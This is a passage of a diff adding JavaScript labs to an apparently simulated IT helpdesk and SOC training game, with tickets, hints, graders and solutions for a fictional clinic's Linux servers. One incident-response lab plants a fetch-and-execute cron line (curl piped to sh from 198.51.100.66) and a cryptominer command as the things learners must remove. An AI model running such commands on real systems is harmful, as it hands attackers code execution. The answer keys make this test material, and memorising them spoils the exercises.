+  mkf(S,'/var/log/syslog',S.fs['/var/log/syslog'].c+'Sep 27 09:02:40 wfc-files01 smbd[2290]: maria: access denied to /srv/shared/billing\n',{o:'syslog',g:'adm',m:0o640});return S;},
+ brief:`<p><b>Ticket WFC-1043</b> from Maria Santos (Billing), priority P2.</p><p>"Since the file server was rebuilt last night, I get Permission denied when I open the billing shared folder. Tom says the same. We need the claims queue today."</p>
+<p>Goal on <code>wfc-files01</code>:</p><ul><li><code>/srv/shared/billing</code> and everything in it belong to group <code>billing</code></li><li>The billing group can read and write there (and enter the folder)</li><li>Other users get no access at all (the folder contains patient billing data)</li><li>Maria (<code>maria</code>) and Tom (<code>tchen</code>) are both in the billing group</li></ul>
+<p class="muted">Tip: <code>/srv/shared/frontdesk</code> is set up correctly. Compare with it.</p>`,
+ hints:['Look at owners and permissions with <code>ls -l /srv/shared</code> and <code>ls -l /srv/shared/billing</code> (you may need sudo for the second).',
+  'Check group membership with <code>groups maria</code> and <code>groups tchen</code>. Is Maria in billing?',
+  'Give the folder and its files to the billing group: <code>sudo chown -R root:billing /srv/shared/billing</code>. Then set folder permissions like frontdesk: <code>sudo chmod 2770 /srv/shared/billing</code> (the 2 keeps new files in the group).',
+  'Add Maria: <code>sudo usermod -aG billing maria</code>. Test as her with <code>sudo -u maria ls -l /srv/shared/billing</code>.'],
+ check(S){const p=[],d=S.fs['/srv/shared/billing'];if(!d)return {problems:['/srv/shared/billing was deleted! Press Reset. Never delete data to fix a permission problem.']};
+  if(d.g!=='billing')p.push('The folder /srv/shared/billing belongs to group '+d.g+', not billing (use chown root:billing or chgrp billing).');
+  if(((d.m>>3)&7)!==7)p.push('The billing group does not have full rwx on the folder (group part of '+octal(d.m)+' should be 7).');
+  if((d.m&7)!==0)p.push('Other users still have access to the folder (last digit of '+octal(d.m)+' should be 0). It contains PHI.');
+  const files=descendants(S,'/srv/shared/billing').filter(k=>S.fs[k].t==='f');const lost=['claims-queue.csv','invoices-2026-09.xlsx','README.txt'].filter(f=>!S.fs['/srv/shared/billing/'+f]);
+  if(lost.length)p.push('Files were deleted: '+lost.join(', ')+'. Press Reset and fix permissions without removing data.');
+  const wrongG=files.filter(k=>S.fs[k].g!=='billing');if(wrongG.length)p.push('These files are not in group billing yet: '+wrongG.map(baseName).join(', ')+'. Use chown -R (the R means recursive).');
+  const noRW=files.filter(k=>((S.fs[k].m>>3)&6)!==6&&baseName(k)!=='README.txt');if(noRW.length)p.push('The billing group cannot write these files: '+noRW.map(baseName).join(', ')+'.');
+  const openF=files.filter(k=>(S.fs[k].m&4));if(openF.length&&(d.m&7))p.push('Files are world readable: '+openF.map(baseName).join(', ')+'.');
+  ['maria','tchen'].forEach(u=>{if(!S.users[u]||!userGroups(S,u).includes('billing'))p.push(u+' is not in the billing group (sudo usermod -aG billing '+u+').');});
+  if(S.users.jlopez&&userGroups(S,'jlopez').includes('billing'))p.push('jlopez (front desk) was added to billing. Remove her, least privilege.');
+  return {problems:p};},
+ resume:'Hands-on lab (simulated Linux file server): fixed a "Permission denied" ticket on a shared folder containing PHI using chown -R, chmod 2770 (setgid) and usermod -aG, then verified access as the affected user with sudo -u.',
+ learned:`<p>Linux permissions are three sets of <b>rwx</b>: owner, group, others. As numbers r=4, w=2, x=1, so 770 means owner and group get everything and others nothing.</p><p>On a folder, <b>x</b> means "may enter" and <b>r</b> means "may list". You need both to open files inside.</p><p><b>chown -R user:group</b> changes owner and group for a folder and everything inside. The leading <b>2</b> in 2770 is setgid, so new files inherit the folder's group.</p><p>Group changes apply at the next login, so users may need to sign out and back in. Testing with <code>sudo -u USER</code> proves the fix before you close the ticket.</p>`,
+ solve:['ls -l /srv/shared','sudo ls -l /srv/shared/billing','groups maria','sudo chown -R root:billing /srv/shared/billing','sudo chmod 2770 /srv/shared/billing','sudo usermod -aG billing maria','sudo -u maria ls -l /srv/shared/billing']});
+/* ---------- Lab 4: disk full ---------- */
+LABS.push({id:4,tid:'WFC-1044',cat:'hd',pri:'P1',title:'Disk full on intranet server',summary:'Uploads fail with "No space left on device".',host:'wfc-web01',
+ requester:'Dr. Alvarez, Clinical Lead',
+ setup(){const S=baseState(this.host);S.disk.base=9.1*GB;
+  mkd(S,'/var/log/app',{m:0o750});mkd(S,'/var/lib/clinic',{m:0o750});mkd(S,'/etc/clinic-portal');mkd(S,'/var/www/portal',{o:'www-data'});mkd(S,'/var/www/portal/uploads',{o:'www-data'});
+  mkf(S,'/var/log/app/portal-debug.log','2026-09-27 09:13:59 DEBUG request id=88213 headers={...}\n2026-09-27 09:13:59 DEBUG sql SELECT * FROM appointments WHERE ...\n2026-09-27 09:14:00 DEBUG cache miss key=sched:2026-09-28\n',{sz:Math.round(36.4*GB)});
+  mkf(S,'/var/log/app/portal.log','2026-09-27 09:14:02 ERROR upload failed: [Errno 28] No space left on device\n',{sz:118*MB});
+  mkf(S,'/var/log/app/portal.log.1','2026-09-26 23:59:59 INFO rotated\n',{sz:84*MB});
+  mkf(S,'/var/lib/clinic/records.db','(database)',{sz:Math.round(2.1*GB),m:0o640});
+  mkf(S,'/var/backups/records-2026-09-26.tar.gz','(backup archive)',{sz:Math.round(1.7*GB),m:0o600});
+  mkf(S,'/etc/clinic-portal/portal.conf','# Westside patient portal settings\nlisten_port = 8080\nupload_dir = /var/www/portal/uploads\nlog_file = /var/log/app/portal.log\n# TEMP for vendor troubleshooting (ticket WFC-0977). Set back to info when done!\nlog_level = debug\ndebug_log_file = /var/log/app/portal-debug.log\n');
+  S.services['clinic-portal']={desc:'Westside Patient Portal',active:true,proc:'python3',pid:1203,ports:[8080]};
+  S.journal['clinic-portal']=['Sep 27 09:14:02 wfc-web01 clinic-portal[1203]: ERROR upload failed: [Errno 28] No space left on device'];
+  S.procs.push({pid:1203,user:'www-data',cpu:3.1,mem:4.2,cmd:'python3 /opt/clinic-portal/app.py --config /etc/clinic-portal/portal.conf'});
+  mkd(S,'/opt/clinic-portal');mkf(S,'/opt/clinic-portal/app.py','# portal app\n',{sz:24*KB});return S;},
+ brief:`<p><b>Ticket WFC-1044</b> from Dr. Alvarez, priority P1.</p><p>"Nobody can upload scanned referrals to the patient portal. The error says No space left on device."</p>
+<p>Goal on <code>wfc-web01</code>:</p><ul><li>Find what is filling the disk and free space so the root filesystem is under 80% used</li><li>The portal vendor confirmed the <b>debug</b> log can be deleted. Never delete the patient database (<code>/var/lib/clinic</code>) or backups</li><li>Stop it from happening again: debug logging was left on in the portal config</li></ul>`,
+ hints:['Confirm the problem with <code>df -h</code>. Look at the Use% column for <code>/</code>.',
+  'Find the big folder step by step: <code>sudo du -sh /var/*</code>, then go deeper, for example <code>sudo du -sh /var/log/*</code>. Or search: <code>sudo find / -size +1G</code>.',
+  'The culprit is <code>/var/log/app/portal-debug.log</code>. Remove it with <code>sudo rm /var/log/app/portal-debug.log</code> and check <code>df -h</code> again.',
+  'Open the config with <code>sudo edit /etc/clinic-portal/portal.conf</code> and change <code>log_level = debug</code> to <code>log_level = info</code>. Save.'],
+ check(S){const p=[];const pct=Math.ceil(diskUsed(S)/S.disk.total*100);
+  if(!S.fs['/var/lib/clinic/records.db'])p.push('You deleted /var/lib/clinic/records.db, the patient records database! In real life that is a major incident. Press Reset and try again.');
+  if(!S.fs['/var/backups/records-2026-09-26.tar.gz'])p.push('You deleted last night\'s backup. Backups are not safe to remove to free space. Press Reset.');
+  if(!S.fs['/var/log/app/portal.log'])p.push('portal.log is the live application log and should be kept (only the debug log was approved for deletion).');
+  if(pct>=80)p.push('The root filesystem is still '+pct+'% full. Find the largest file with du or find and remove the approved one.');
+  const cf=S.fs['/etc/clinic-portal/portal.conf'];if(!cf)p.push('/etc/clinic-portal/portal.conf is missing. Press Reset.');
+  else{const m=cf.c.match(/^\s*log_level\s*=\s*(\S+)/m);if(!m)p.push('portal.conf has no log_level line anymore. Add log_level = info.');else if(m[1].toLowerCase()==='debug')p.push('log_level is still debug in /etc/clinic-portal/portal.conf, so the disk will fill up again. Change it to info.');}
+  return {problems:p};},
+ resume:'Hands-on lab (simulated Ubuntu server): resolved a P1 "disk full" outage by tracing usage with df, du and find, safely removing a 36 GB runaway debug log while protecting the database and backups, and fixing the root cause in the app config.',
+ learned:`<p><b>df -h</b> shows how full each filesystem is. <b>du -sh</b> shows how big a folder is, so you drill down folder by folder. <b>find / -size +1G</b> jumps straight to huge files.</p><p>Always ask what is safe to delete. Logs usually are, databases and backups are not.</p><p>Fix the root cause (here debug logging) or the ticket comes back next week.</p><p>Pro tip: if a running program still holds a deleted file open, the space is not freed until that program restarts (<code>systemctl restart</code>). On real servers, <code>truncate -s 0 FILE</code> avoids that.</p>`,
+ solve:['df -h','sudo du -sh /var/*','sudo du -sh /var/log/*','sudo find / -size +1G','sudo rm /var/log/app/portal-debug.log','df -h',{edit:'sudo edit /etc/clinic-portal/portal.conf',find:'log_level = debug',replace:'log_level = info'}]});
+/* ---------- Lab 5: service won't start ---------- */
+const NGX_MAIN='user www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n    worker_connections 768;\n}\n\nhttp {\n    sendfile on;\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n    include /etc/nginx/sites-enabled/*;\n}\n';
+const NGX_SITE='# Patient portal (edited by vendor 09-26)\nserver {\n    listen 80;\n    server_nme portal.westside.local;\n    root /var/www/portal;\n    index index.html;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}\n';
+LABS.push({id:5,tid:'WFC-1045',cat:'hd',pri:'P1',title:'Patient portal web service down',summary:'nginx will not start after a vendor change.',host:'wfc-web01',
+ requester:'Operations Manager',
+ setup(){const S=baseState(this.host);mkd(S,'/etc/nginx');mkd(S,'/etc/nginx/sites-enabled');mkd(S,'/var/log/nginx',{o:'www-data',g:'adm'});mkd(S,'/var/www/portal',{o:'www-data'});
+  mkf(S,'/etc/nginx/nginx.conf',NGX_MAIN);mkf(S,'/etc/nginx/mime.types','types { text/html html; }\n');mkf(S,'/etc/nginx/sites-enabled/portal.conf',NGX_SITE);
+  mkf(S,'/var/www/portal/index.html',PORTAL_HTML,{o:'www-data'});
+  mkf(S,'/var/log/nginx/error.log','2026/09/27 08:02:11 [emerg] 1180#1180: unknown directive "server_nme" in /etc/nginx/sites-enabled/portal.conf:4\n',{o:'www-data',g:'adm',m:0o640});
+  S.services.nginx={desc:'A high performance web server and a reverse proxy server',active:false,failed:true,validate:'nginx',ports:[80],proc:'nginx',page:PORTAL_HTML,since:'08:02:11'};
+  const h=this.host;S.journal.nginx=['Sep 27 08:02:11 '+h+' systemd[1]: Starting nginx.service - A high performance web server and a reverse proxy server...','Sep 27 08:02:11 '+h+' nginx[1180]: nginx: [emerg] unknown directive "server_nme" in /etc/nginx/sites-enabled/portal.conf:4','Sep 27 08:02:11 '+h+' nginx[1180]: nginx: configuration file /etc/nginx/nginx.conf test failed','Sep 27 08:02:11 '+h+' systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE','Sep 27 08:02:11 '+h+" systemd[1]: nginx.service: Failed with result 'exit-code'.",'Sep 27 08:02:11 '+h+' systemd[1]: Failed to start nginx.service - A high performance web server and a reverse proxy server.'];
+  return S;},
+ brief:`<p><b>Ticket WFC-1045</b> from the Operations Manager, priority P1.</p><p>"The patient portal has been down since this morning. The vendor changed something yesterday afternoon. Patients are calling!"</p>
+<p>Goal on <code>wfc-web01</code>:</p><ul><li>Find out why the <code>nginx</code> service will not start</li><li>Fix the configuration mistake (do not delete the site config)</li><li>Get nginx running and confirm the portal answers locally</li></ul>`,
+ hints:['Ask systemd first: <code>systemctl status nginx</code>. Is it active or failed?',
+  'Read the service log: <code>journalctl -u nginx</code>. The [emerg] line names the file and line number.',
+  'Test the config any time with <code>sudo nginx -t</code>. The problem is a typo on line 4 of <code>/etc/nginx/sites-enabled/portal.conf</code>. Open it with <code>sudo edit /etc/nginx/sites-enabled/portal.conf</code>.',
+  'Fix <code>server_nme</code> to <code>server_name</code>, save, run <code>sudo nginx -t</code>, then <code>sudo systemctl restart nginx</code> and <code>curl http://localhost</code>.'],
+ check(S){const p=[];const f=S.fs['/etc/nginx/sites-enabled/portal.conf'];
+  if(!f)p.push('/etc/nginx/sites-enabled/portal.conf is gone. The portal site needs it. Press Reset and edit the file instead.');
+  else if(!/^\s*server_name\s+portal\.westside\.local\s*;/m.test(f.c))p.push('portal.conf should contain the line: server_name portal.westside.local;');
+  const e=VALIDATORS.nginx(S);if(e)p.push('The nginx config still has an error: '+e+'. Run sudo nginx -t to see it.');
+  const s=S.services.nginx;if(!s.active)p.push('nginx is not running. After fixing the config, run sudo systemctl restart nginx.');
+  if(s.enabled===false)p.push('nginx is disabled, so it will not start after a reboot. Run sudo systemctl enable nginx.');
+  return {problems:p};},
+ resume:'Hands-on lab (simulated Ubuntu server): restored a failed nginx web service by diagnosing with systemctl status and journalctl, validating config with nginx -t, correcting a directive typo, and verifying service health with curl.',
+ learned:`<p><b>systemctl status</b> tells you if a service is running and shows its last log lines. <b>journalctl -u NAME</b> shows the full log for that service.</p><p>Many daemons have a config test. For nginx it is <b>nginx -t</b>. Run it before every restart so a typo never takes a site down.</p><p>Workflow to remember: status, logs, test, fix, test again, restart, verify.</p><p>Always keep a copy before editing (<code>sudo cp file file.bak</code>) so you can roll back.</p>`,
+ solve:['systemctl status nginx','journalctl -u nginx','sudo nginx -t',{edit:'sudo edit /etc/nginx/sites-enabled/portal.conf',find:'server_nme',replace:'server_name'},'sudo nginx -t','sudo systemctl restart nginx','curl http://localhost']});
+/* ---------- Lab 6: network ---------- */
+LABS.push({id:6,tid:'WFC-1046',cat:'hd',pri:'P2',title:'EHR and lab portal unreachable',summary:'The check-in kiosk cannot reach internal sites, but Google works.',host:'wfc-kiosk01',
+ requester:'Jenna Lopez, Front Desk',
+ setup(){const S=baseState(this.host);S.net.myip='10.0.0.61';
+  mkf(S,'/etc/hosts','127.0.0.1   localhost\n127.0.1.1   wfc-kiosk01\n\n# added during EHR migration test, remove after cutover\n10.0.0.99   ehr.westside.local\n');
+  mkf(S,'/etc/resolv.conf','# Generated by NetworkManager\nnameserver 8.8.8.8\nsearch westside.local\n');
+  mkf(S,'/home/ricardo/network-info.txt','Westside Family Clinic network notes\n  Gateway:      10.0.0.1\n  Clinic DNS:   10.0.0.2 (dc01.westside.local), required for all clinic machines\n  EHR server:   ehr.westside.local  (new server since Sep 20)\n  Lab results:  labs.westside.local\n',{o:'ricardo'});return S;},
+ brief:`<p><b>Ticket WFC-1046</b> from Jenna Lopez (Front Desk), priority P2.</p><p>"The check-in kiosk can't open the EHR. It just spins. The lab results site says server not found. But Google works, so the internet is fine?"</p>
+<p>Goal on the kiosk <code>wfc-kiosk01</code>:</p><ul><li><code>ehr.westside.local</code> must reach the new EHR server, and <code>curl http://ehr.westside.local</code> must load the sign-in page</li><li><code>labs.westside.local</code> must resolve and load</li><li>Internet names like google.com must keep working</li></ul><p class="muted">Network notes are in <code>~/network-info.txt</code>.</p>`,
+ hints:['Reproduce it: <code>ping ehr.westside.local</code>, <code>curl http://labs.westside.local</code>, <code>ping google.com</code>. Note which IP ping shows for the EHR.',
+  'Compare with DNS: <code>nslookup ehr.westside.local 10.0.0.2</code>. nslookup skips <code>/etc/hosts</code>, but ping and curl read it first. Look at <code>cat /etc/hosts</code>.',
+  'Two problems: a stale test line in <code>/etc/hosts</code>, and <code>/etc/resolv.conf</code> uses a public DNS server that knows nothing about westside.local. Check <code>cat /etc/resolv.conf</code> and <code>cat ~/network-info.txt</code>.',
+  'Run <code>sudo edit /etc/hosts</code> and delete the 10.0.0.99 line. Then <code>sudo edit /etc/resolv.conf</code> and change the nameserver to <code>10.0.0.2</code>. Verify with ping and curl.'],
+ check(S){const p=[];const hm=parseHosts(S);
+  if(hm.localhost!=='127.0.0.1')p.push('The localhost line was removed from /etc/hosts. Put back: 127.0.0.1   localhost');
+  if(hm['ehr.westside.local']&&hm['ehr.westside.local']!=='10.0.0.25')p.push('/etc/hosts still sends ehr.westside.local to '+hm['ehr.westside.local']+' (the old test server). Remove that line.');
+  const r=resolveHost(S,'ehr.westside.local');if(r.ip!=='10.0.0.25'&&!(hm['ehr.westside.local']&&hm['ehr.westside.local']!=='10.0.0.25'))p.push('ehr.westside.local does not resolve to the EHR server (10.0.0.25) yet. Check the nameserver in /etc/resolv.conf.');
+  const l=resolveHost(S,'labs.westside.local');if(l.ip!=='10.0.0.30')p.push('labs.westside.local does not resolve: /etc/resolv.conf is using '+(nameservers(S).join(', ')||'no nameserver')+'. Clinic machines must use the clinic DNS server 10.0.0.2.');
+  if(!resolveHost(S,'google.com').ip)p.push('Internet names like google.com no longer resolve. Keep a working nameserver (10.0.0.2 also forwards internet names).');
+  return {problems:p};},
+ resume:'Hands-on lab (simulated Linux kiosk): troubleshot internal site outages with ping, nslookup and curl, identified a stale /etc/hosts override and a misconfigured DNS resolver, and restored name resolution for clinic systems.',
+ learned:`<p>Name resolution order on Linux: <b>/etc/hosts first</b>, then the DNS servers in <b>/etc/resolv.conf</b>. A forgotten hosts entry silently overrides DNS.</p><p><b>nslookup</b> and <b>dig</b> query DNS directly and ignore /etc/hosts. When nslookup gives the right IP but ping does not, check /etc/hosts.</p><p>Public DNS (8.8.8.8) cannot answer for private names like westside.local. That is why "Google works" did not prove the network was fine.</p><p>Troubleshoot in layers: can I reach an IP (ping), does the name resolve (nslookup), does the app answer (curl)?</p>`,
+ solve:['ping ehr.westside.local','curl http://labs.westside.local','nslookup ehr.westside.local 10.0.0.2','cat /etc/hosts','cat /etc/resolv.conf',{edit:'sudo edit /etc/hosts',find:'10.0.0.99   ehr.westside.local\n',replace:''},{edit:'sudo edit /etc/resolv.conf',find:'nameserver 8.8.8.8',replace:'nameserver 10.0.0.2'},'ping -c 2 ehr.westside.local','curl http://ehr.westside.local','curl -I http://labs.westside.local']});
+/* ---------- Lab 7: SOC brute force ---------- */
+LABS.push({id:7,tid:'WFC-SOC-2071',cat:'soc',pri:'P1',title:'SSH brute-force alert',summary:'SIEM alert: many failed SSH logins on the remote access server.',host:'wfc-vpn01',
+ requester:'SIEM alert, Tier 1 queue',answer:true,
+ setup(){const S=baseState(this.host);S.groups.clinicians=1105;addUser(S,'drsmith',1003,{gecos:'Dr. Karen Smith',groups:['clinicians']});addUser(S,'jlopez',1001,{gecos:'Jenna Lopez'});
+  const L=[];const A=(t,pid,m)=>L.push(authLine(S,t,pid,m));const h=this.host;
+  A('06:10:44',1210,'Accepted publickey for ricardo from 10.0.0.60 port 50122 ssh2: ED25519 SHA256:q1w2e3');
+  L.push('Sep 27 06:17:01 '+h+' CRON[1260]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)');
+  [['admin',51234],['admin',51240],['root',51302],['root',51311],['oracle',51388],['test',51420]].forEach((x,i)=>{const inv=x[0]!=='root';if(inv)A('06:55:'+String(10+i*7),1400+i,'Invalid user '+x[0]+' from 198.51.100.7 port '+x[1]);A('06:55:'+String(12+i*7),1400+i,'Failed password for '+(inv?'invalid user ':'')+x[0]+' from 198.51.100.7 port '+x[1]+' ssh2');});
+  A('06:55:58',1407,'Connection closed by 198.51.100.7 port 51420 [preauth]');
+  A('07:30:02',1510,'Failed password for jlopez from 10.0.0.51 port 50991 ssh2');A('07:30:19',1511,'Accepted password for jlopez from 10.0.0.51 port 50993 ssh2');
+  A('07:30:19',1511,'pam_unix(sshd:session): session opened for user jlopez(uid=1001) by (uid=0)');
+  A('08:11:48',2000,'Failed password for root from 203.0.113.45 port 40001 ssh2');A('08:11:55',2001,'Failed password for root from 203.0.113.45 port 40003 ssh2');
+  for(let i=0;i<38;i++){const s=12*60+1+i*7;const t='08:'+String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');A(t,2010+i,'Failed password for drsmith from 203.0.113.45 port '+(40010+i*3)+' ssh2');if(i%6===5)A(t,2010+i,'Disconnecting authenticating user drsmith 203.0.113.45 port '+(40010+i*3)+': Too many authentication failures [preauth]');}
+  A('08:16:52',2060,'Accepted password for drsmith from 203.0.113.45 port 40122 ssh2');A('08:16:52',2060,'pam_unix(sshd:session): session opened for user drsmith(uid=1003) by (uid=0)');
+  L.push('Sep 27 08:19:30 '+h+' sudo:  drsmith : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/drsmith ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow');
+  A('08:24:10',2060,'pam_unix(sshd:session): session closed for user drsmith');
+  A('09:02:31',2101,'Accepted password for drsmith from 10.0.0.72 port 51800 ssh2');
+  S.fs['/var/log/auth.log'].c=L.join('\n')+'\n';
+  mkf(S,'/home/ricardo/alert-SOC-2071.txt','SIEM ALERT SOC-2071  severity: HIGH\nRule:    SSH brute force (more than 20 failed logins from one source in 5 minutes)\nHost:    wfc-vpn01 (internet facing SSH)\nWindow:  2026-09-27 08:10 to 08:20 CDT\nAction:  Tier 1, review /var/log/auth.log and fill in the incident form.\n',{o:'ricardo'});return S;},
+ brief:`<p><b>Alert WFC-SOC-2071</b>, severity HIGH.</p><p>The SIEM fired "SSH brute force" on <code>wfc-vpn01</code>, the clinic's internet-facing SSH server, between 08:10 and 08:20. As Tier 1 SOC analyst you must triage it from the logs.</p>
+<p>Use the terminal to investigate <code>/var/log/auth.log</code>, then fill in the incident answer form:</p><ul><li>The attacker's IP address (the source of the brute force in the alert window)</li><li>The account it targeted most</li><li>Whether the attacker ever logged in successfully</li></ul><p class="muted">Alert details: <code>cat ~/alert-SOC-2071.txt</code>. There is some unrelated background noise in the log too.</p>`,
+ hints:['Get a feel for the log: <code>tail -n 20 /var/log/auth.log</code> and <code>grep -c "Failed password" /var/log/auth.log</code>.',
+  'Count failures per source IP: <code>grep "Failed password" /var/log/auth.log | grep -oE "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" | sort | uniq -c</code>',
+  'Now look at just that IP: <code>grep 203.0.113.45 /var/log/auth.log | tail</code>. Which username shows up again and again?',
+  'Search for successful logins: <code>grep Accepted /var/log/auth.log</code>. Did any come from the attacker IP? Look at what happened right after, too.'],
+ check(S,ans){const p=[];ans=ans||{};const ip=(ans.ip||'').trim(),u=(ans.user||'').trim().toLowerCase(),ok=ans.ok||'';
+  if(!ip)p.push('Attacker IP is empty in the answer form.');else if(ip!=='203.0.113.45')p.push('Attacker IP "'+ip+'" is not the brute-force source in the alert window. Count Failed password lines per IP.'+(ip==='198.51.100.7'?' (198.51.100.7 is an earlier low-volume scanner, noise outside the alert window.)':''));
+  if(!u)p.push('Targeted account is empty.');else if(u!=='drsmith')p.push('Targeted account "'+u+'" is not the one most attacked. Filter the log by the attacker IP and look at the usernames.');
+  if(!ok)p.push('Choose whether the attacker logged in successfully.');else if(ok!=='yes')p.push('Look again for an "Accepted password" line from the attacker IP. The answer about success is not right yet.');
+  return {problems:p,notes:p.length?[]:['Next steps a SOC would take: disable or reset drsmith, kill the session, block 203.0.113.45 at the firewall, check what drsmith did (the log shows a failed sudo cat /etc/shadow), and escalate to Tier 2. The 09:02 login from 10.0.0.72 is Dr. Smith inside the clinic, which a good analyst would confirm with her.']};},
+ resume:'Hands-on lab (simulated SOC triage): investigated an SSH brute-force alert by analyzing Linux auth.log with grep, sort and uniq pipelines, identified the attacking IP and targeted account, and confirmed a successful compromise for escalation.',
+ learned:`<p><b>/var/log/auth.log</b> records SSH logins on Ubuntu. Key phrases: <code>Failed password</code>, <code>Invalid user</code> (username does not exist) and <code>Accepted password</code> (success).</p><p>Pipelines turn thousands of lines into an answer: <code>grep</code> filters, <code>grep -o</code> extracts, <code>sort | uniq -c</code> counts, <code>sort -nr</code> ranks.</p><p>Many failures followed by one success from the same IP means a likely compromised account. That is escalated right away, not just closed.</p><p>Always separate noise (random internet scanners) from the event the alert is actually about.</p>`,
+ solveAnswers:{ip:'203.0.113.45',user:'drsmith',ok:'yes'},
+ solve:['cat ~/alert-SOC-2071.txt','grep -c "Failed password" /var/log/auth.log','grep "Failed password" /var/log/auth.log | grep -oE "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" | sort | uniq -c | sort -nr','grep 203.0.113.45 /var/log/auth.log | tail -n 5','grep Accepted /var/log/auth.log']});
+/* ---------- Lab 8: SOC process and cron persistence ---------- */
+const MAL_CRON='*/5 * * * * curl -fsSL http://198.51.100.66/k.sh | sh >/dev/null 2>&1';
+function minerProc(pid){return {pid,user:'www-data',cpu:97.8,mem:6.4,vsz:812344,rss:262144,stat:'Rl',start:'12:05',time:'128:41',cmd:'/tmp/.x/kworkerd -o 198.51.100.66:3333 --donate-level 0 -B',name:'kworkerd',listen:'0.0.0.0:4444',miner:true};}
+LABS.push({id:8,tid:'WFC-SOC-2088',cat:'soc',pri:'P1',title:'Suspicious process and persistence',summary:'CPU pegged at 99% and outbound traffic to an unknown IP.',host:'wfc-web01',
+ requester:'EDR alert, Tier 1 queue',
+ setup(){const S=baseState(this.host);const h=this.host;
+  mkd(S,'/tmp/.x',{o:'www-data'});mkf(S,'/tmp/.x/kworkerd','(ELF 64-bit executable, simulated)',{o:'www-data',m:0o755,sz:2411520});
+  mkf(S,'/tmp/.x/config.json','{ "pools": [ { "url": "198.51.100.66:3333", "user": "wfc01" } ], "background": true }\n',{o:'www-data'});
+  mkf(S,'/tmp/sess_8f2a1c','php session',{o:'www-data',m:0o600});
+  mkd(S,'/var/www/portal',{o:'www-data'});mkd(S,'/var/www/portal/cron',{o:'www-data'});mkf(S,'/var/www/portal/cron/cleanup-sessions.php','<?php // removes expired sessions\n',{o:'www-data'});
+  S.crontabs['www-data']='# m h dom mon dow command\n*/10 * * * * /usr/bin/php /var/www/portal/cron/cleanup-sessions.php\n'+MAL_CRON+'\n';
+  S.crontabs.root='# m h dom mon dow command\n30 2 * * * /usr/local/bin/backup-records.sh\n';
+  mkf(S,'/usr/local/bin/backup-records.sh','#!/bin/bash\n# nightly records backup\n',{m:0o755});
+  const cr=[];for(let m=5;m<=55;m+=10)cr.push('Sep 27 13:'+String(m).padStart(2,'0')+':01 '+h+' CRON[3'+m+'0]: (www-data) CMD ('+MAL_CRON.slice(12)+')');
+  S.fs['/var/log/syslog'].c+='Sep 27 12:05:01 '+h+' CRON[3301]: (www-data) CMD ('+MAL_CRON.slice(12)+')\n'+cr.join('\n')+'\n';
+  S.procs.push({pid:1188,user:'www-data',cpu:0.3,mem:1.2,cmd:'php-fpm: pool www',stat:'S'});S.procs.push(minerProc(3317));
+  S.procs.push({pid:1410,user:'root',cpu:0.0,mem:0.4,cmd:'/usr/sbin/nginx -g daemon on; master_process on;'});
+  S.services.nginx={desc:'A high performance web server and a reverse proxy server',active:true,ports:[80],proc:'nginx',pid:1410,page:PORTAL_HTML};return S;},
+ tick(S){const alive=S.procs.some(p=>p.miner);const cron=(S.crontabs['www-data']||'').includes('198.51.100.66');
+  if(!alive&&cron&&S.killed&&S.killed.length){S.sinceKill=(S.sinceKill||0)+1;if(S.sinceKill>=3){S.procs.push(minerProc(3400+S.tick%500));S.sinceKill=0;
+    if(!S.fs['/tmp/.x'])mkd(S,'/tmp/.x',{o:'www-data'});mkf(S,'/tmp/.x/kworkerd','(ELF 64-bit executable, simulated)',{o:'www-data',m:0o755,sz:2411520});
+    S.fs['/var/log/syslog'].c+=ts(S)+' '+S.host+' CRON[3999]: (www-data) CMD ('+MAL_CRON.slice(12)+')\n';}}},
+ brief:`<p><b>Alert WFC-SOC-2088</b>, severity HIGH.</p><p>EDR reports <code>wfc-web01</code> at 99% CPU since about noon and repeated outbound connections to <code>198.51.100.66</code>, which threat intel lists as a cryptomining pool.</p>
+<p>Contain it:</p><ul><li>Find and stop the malicious process</li><li>Find how it keeps coming back (persistence) and remove only the malicious entry</li><li>Delete the malware file from disk</li><li>Document: write a short note in <code>/home/ricardo/incident-SOC-2088.txt</code> that names the process and the IP</li></ul>`,
+ hints:['Find the CPU hog: <code>top</code> or <code>ps aux</code>. Note the user, PID and path. Check listening ports with <code>sudo ss -tlnp</code>.',
+  'Persistence is often a cron job. Your own <code>crontab -l</code> is empty, but the process runs as www-data: <code>sudo crontab -u www-data -l</code>. Also check <code>grep CRON /var/log/syslog</code>.',
+  'Remove the persistence first, or the process comes back: <code>sudo crontab -u www-data -e</code> and delete only the curl line. Then <code>sudo kill -9 PID</code> and <code>sudo rm -r /tmp/.x</code> (hidden folders need <code>ls -la /tmp</code> to be seen).',
+  'Document it, for example: <code>echo "SOC-2088: killed kworkerd (www-data), C2 198.51.100.66, removed www-data cron entry, deleted /tmp/.x" > ~/incident-SOC-2088.txt</code>'],
+ check(S){const p=[],notes=[];const m=S.procs.find(x=>x.miner);const wc=S.crontabs['www-data']||'';
+  if(wc.includes('198.51.100.66'))p.push('The www-data crontab still has the malicious curl line, so the malware will be downloaded and started again every 5 minutes.');
+  if(m)p.push('The miner kworkerd is running (PID '+m.pid+').'+((S.killed||[]).length?' It came back because the cron job relaunched it. Remove the cron entry, then kill it again.':' Stop it with sudo kill -9 '+m.pid+'.'));
+  if(S.fs['/tmp/.x/kworkerd'])p.push('The malware binary /tmp/.x/kworkerd is still on disk. Remove it with sudo rm -r /tmp/.x (in a real incident you would copy it for forensics first).');
+  if(!(S.crontabs.root||'').includes('backup-records.sh'))p.push('Root\'s legitimate nightly backup job was removed. Restore it with sudo crontab -e and the line: 30 2 * * * /usr/local/bin/backup-records.sh');
+  if(!S.procs.some(x=>x.pid===1188))p.push('You killed php-fpm (PID 1188), part of the legitimate web stack. Press Reset. Only kill what you have identified as malicious.');
+  const n=S.fs['/home/ricardo/incident-SOC-2088.txt'];
+  if(!n||!n.c.trim())p.push('No incident note yet at /home/ricardo/incident-SOC-2088.txt.');
